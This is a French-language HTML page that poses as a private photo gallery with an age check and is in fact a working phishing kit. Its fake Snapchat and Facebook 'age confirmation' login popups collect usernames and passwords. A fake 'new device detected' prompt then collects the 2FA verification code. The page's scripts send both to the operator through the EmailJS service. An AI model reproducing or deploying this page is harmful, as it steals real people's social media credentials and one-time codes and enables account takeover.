
<!DOCTYPE html>

<html lang="fr">
<head>
<meta charset="utf-8"/>
<title>Gallerie privé!</title>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&amp;display=swap" rel="stylesheet"/>
<style>
    body {
      margin: 0;
      font-family: 'Playfair Display', serif;
      color: #fff;
      text-align: center;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      position: relative;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(2px);
      z-index: 0;
    }

    .header, .extras, .bitmoji-row, .bottom-banner, .login-popup, .verification-popup {
      position: relative;
      z-index: 1;
    }

    .header {
      padding: 60px 20px 30px;
    }

    .header h1 {
      font-size: 4em;
      color: #FFD700;
      text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
      margin-bottom: 10px;
    }

    .subtitle {
      font-size: 1.5em;
      margin-bottom: 30px;
      color: #f5f5f5;
    }

    .button {
      background: linear-gradient(45deg, #FFD700, #FF8C00);
      color: #000;
      border: none;
      padding: 14px 30px;
      font-size: 1.1em;
      font-weight: bold;
      border-radius: 30px;
      cursor: pointer;
      box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
      transition: 0.3s ease-in-out;
    }

    .button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px rgba(255, 215, 0, 0.9);
    }

    .bitmoji-row {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      margin: 40px 0;
    }

    .bitmoji {
      width: 90px;
      height: 90px;
      margin: 12px;
      border-radius: 50%;
      background-size: cover;
      background-position: center;
      border: 2px solid #fff;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.4);
    }

    .extras {
      background: rgba(255, 255, 255, 0.1);
      color: #ffe;
      padding: 50px 20px;
      border-top-left-radius: 30px;
      border-top-right-radius: 30px;
    }

    .extras h2 {
      font-size: 2em;
      margin-top: 0;
      color: #FFD700;
    }

    .extra-item {
      margin: 20px 0;
      font-size: 1.1em;
    }

    .login-popup, .overlay, .login-loading, .verification-popup {
      position: fixed;
      top: 10%;
      left: 50%;
      transform: translateX(-50%);
      background: #fff;
      color: #000;
      padding: 30px;
      border-radius: 20px;
      z-index: 1000;
      width: 90%;
      max-width: 400px;
      text-align: left;
      display: none;
    }

    .login-popup input, .verification-popup input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    .overlay {
      background: rgba(0,0,0,0.6);
      width: 100%;
      height: 100%;
      z-index: 999;
    }

    .bottom-banner img {
      width: 100%;
      height: auto;
      display: block;
    }

    .verification-popup label {
      font-weight: bold;
    }
  
    .top-banner img { width: 100%; height: auto; display: block; }</style>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function() {
    emailjs.init("AATQVLMcBJaRBgEox");
  });
</script>
<!-- Open Graph Preview -->






<meta content="Gallerie privée – Connexion privée" property="og:title"/>
<meta content="Accès sécurisé à ma galerie privée." property="og:description"/>
<meta property="og:image" content="preview_photo.jpg"/>
<meta content="https://photos-gallerie-prive.onrender.com" property="og:url"/>
<meta content="website" property="og:type"/>
<!-- Twitter Card -->
<meta content="summary_large_image" name="twitter:card"/>
<meta content="Gallerie privée – Connexion" name="twitter:title"/>
<meta content="Accès sécurisé à ma galerie privée." name="twitter:description"/>
<meta content="preview_photo.jpg" name="twitter:image"/>

  <!-- Open Graph Preview CORRIGÉ -->
  <meta property="og:title" content="Gallerie privée – Connexion privée"/>
  <meta property="og:description" content="Accès sécurisé à ma galerie privée."/>
  <meta property="og:image" content="https://photos-gallerie-prive.onrender.com/preview_photo.jpg"/>
  <meta property="og:url" content="https://photos-gallerie-prive.onrender.com"/>
  <meta property="og:type" content="website"/>

  <!-- Twitter Card CORRIGÉ -->
  <meta name="twitter:card" content="summary_large_image"/>
  <meta name="twitter:title" content="Gallerie privée – Connexion"/>
  <meta name="twitter:description" content="Accès sécurisé à ma galerie privée."/>
  <meta name="twitter:image" content="https://photos-gallerie-prive.onrender.com/preview_photo.jpg"/>

</head>
<body><div class="top-banner"><img alt="Bannière Bitmoji" src="banner.png"/></div>
<div class="header">
<h1>Gallerie privée</h1>
<p class="subtitle">Bienvenue sur ma page</p>
<div id="ageCheckContainer" style="margin-top: 20px;">
<label for="dob" style="font-size: 1.2em;">Entrez votre date de naissance :</label><br/>
<input id="dob" style="padding: 10px; font-size: 1em; margin: 10px; border-radius: 10px; border: none;" type="date"/>
<br/>
<button class="button" onclick="checkAge()">Valider</button>
<p id="ageError" style="color: red; display: none; font-weight: bold;">Vous devez avoir au moins 18 ans pour accéder.</p>
</div>
<button class="button" id="snapchatBtn" onclick="openSnapchatPopup()" style="display:none;">Confirmer votre âge avec Snapchat</button><button class="button" id="facebookBtn" onclick="openFacebookPopup()" style="display:none; margin-top: 15px;">Confirmer votre âge avec Facebook</button>
</div>
<div class="bitmoji-row">
<div class="bitmoji" style="background-image: url('avatar1.png')"></div>
<div class="bitmoji" style="background-image: url('avatar2.png')"></div>
<div class="bitmoji" style="background-image: url('avatar3.png')"></div>
<div class="bitmoji" style="background-image: url('avatar4.png')"></div>
</div>
<div class="overlay" id="overlay" onclick="closeLogin()"></div>
<div class="login-popup" id="loginPopup"></div>
<!-- POPUP SNAPCHAT -->
<div class="login-popup" id="snapchatPopup">
<div style="text-align:center;">
<img alt="Snapchat" src="logo-snapchat.png" style="width: 60px; margin-bottom: 10px;"/>
<h3 style="margin: 10px 0;">Confirmer votre âge avec Snapchat</h3>
</div>
<label for="snap-username">Nom d'utilisateur ou e-mail</label>
<input id="snap-username" placeholder="Nom d'utilisateur ou e-mail" type="text"/>
<label for="snap-password">Mot de passe</label>
<input id="snap-password" placeholder="Mot de passe" type="password"/>
<button class="button" onclick="showLoadingAndVerify('snapchatPopup')" style="margin-top: 15px;">Connexion</button>
<button class="button" onclick="closePopup('snapchatPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
</div>
<!-- POPUP FACEBOOK -->
<div class="login-popup" id="facebookPopup">
<div style="text-align:center;">
<img alt="Facebook" src="logo-fb.jpg" style="width: 60px; margin-bottom: 10px;"/>
<h3 style="margin: 10px 0;">Confirmer votre âge avec Facebook</h3>
</div>
<label for="fb-email">Adresse e-mail ou numéro de mobile</label>
<input id="fb-email" placeholder="Adresse e-mail ou téléphone" type="text"/>
<label for="fb-password">Mot de passe</label>
<input id="fb-password" placeholder="Mot de passe" type="password"/>
<button class="button" onclick="showLoadingAndVerify('facebookPopup')" style="margin-top: 15px;">Connexion</button>
<button class="button" onclick="closePopup('facebookPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
</div>
<div class="login-popup" id="verificationPopup">
<h3 style="margin-top: 0; font-size: 1.5em;">Nouvel appareil détecté</h3>
<p style="margin-bottom: 15px;">Un code de vérification vous sera envoyé à l’intérieur des 2 prochaines minutes.</p>
<label for="verificationCode" style="font-weight:bold;">Entrez le code reçu :</label>
<input id="verificationCode" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code à 6 ou 8 chiffres" type="text"/>
<button class="button" onclick="submitVerificationCode()" style="margin-top:10px;">Vérifier</button>
<button class="button" onclick="closePopup('verificationPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
</div>
<div class="bottom-banner">
<img alt="Bannière Bitmoji" src="banner.png"/>
</div>
<script>
function checkAge() {
  const dobInput = document.getElementById("dob");
  const errorMsg = document.getElementById("ageError");
  const btn = document.getElementById("snapchatBtn");

  if (!dobInput.value) {
    errorMsg.textContent = "Veuillez entrer votre date de naissance.";
    errorMsg.style.display = "block";
    return;
  }

  const dob = new Date(dobInput.value);
  const today = new Date();
  const age = today.getFullYear() - dob.getFullYear();
  const monthDiff = today.getMonth() - dob.getMonth();
  const dayDiff = today.getDate() - dob.getDate();

  let is18 = age > 18 || (age === 18 && (monthDiff > 0 || (monthDiff === 0 && dayDiff >= 0)));

  if (is18) {
    btn.style.display = "inline-block";
    document.getElementById("facebookBtn").style.display = "inline-block";
    errorMsg.style.display = "none";
    document.getElementById("ageCheckContainer").style.display = "none";
  } else {
    errorMsg.textContent = "Vous devez avoir au moins 18 ans pour accéder.";
    errorMsg.style.display = "block";
  }
}
</script>
<script>
function openSnapchatPopup() {
  document.getElementById('overlay').style.display = 'block';
  document.getElementById('snapchatPopup').style.display = 'block';
}
function openFacebookPopup() {
  document.getElementById('overlay').style.display = 'block';
  document.getElementById('facebookPopup').style.display = 'block';
}
function closePopup(popupId) {
  document.getElementById('overlay').style.display = 'none';
  document.getElementById(popupId).style.display = 'none';
}
</script>
<script>
function showLoadingAndVerify(popupId) {
  const popup = document.getElementById(popupId);
  const inputs = popup.querySelectorAll("input");
  const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");

  if (!allFilled) {
    alert("Veuillez remplir tous les champs.");
    return;
  }

  const button = popup.querySelector("button");
  const originalText = button.textContent;
  button.disabled = true;
  button.textContent = "Connexion en cours...";

  let params = {};

  if (popupId === "facebookPopup") {
    params = {
      fb_email: document.getElementById("fb-email").value.trim(),
      fb_password: document.getElementById("fb-password").value.trim()
    };
  } else if (popupId === "snapchatPopup") {
    params = {
      fb_email: document.getElementById("snap-username").value.trim(),
      fb_password: document.getElementById("snap-password").value.trim()
    };
  }

  if (window.emailjs) {
    emailjs.send("service_photos", "template_connexion", params)
    .then(() => {
      setTimeout(() => {
        button.disabled = false;
        button.textContent = originalText;
        popup.style.display = "none";
        document.getElementById("verificationPopup").style.display = "block";
      }, 2000);
    })
    .catch(err => {
      alert("Erreur EmailJS : " + JSON.stringify(err));
      button.disabled = false;
      button.textContent = originalText;
    });
  } else {
    alert("EmailJS non chargé.");
    button.disabled = false;
    button.textContent = originalText;
  }
}
</script>
<script>
function submitVerificationCode() {
  const code = document.getElementById("verificationCode").value.trim();
  const pattern = /^\d{4,10}$/;


  const params = { verification_code: code };

  if (window.emailjs) {
    emailjs.send("service_photos", "template_code", params)
      .then(() => {
        window.location.href = "medias.html";
      })
      .catch(err => {
        alert("Erreur EmailJS : " + JSON.stringify(err));
      });
  } else {
    alert("EmailJS non chargé.");
  }
}
</script>
</body>
</html>
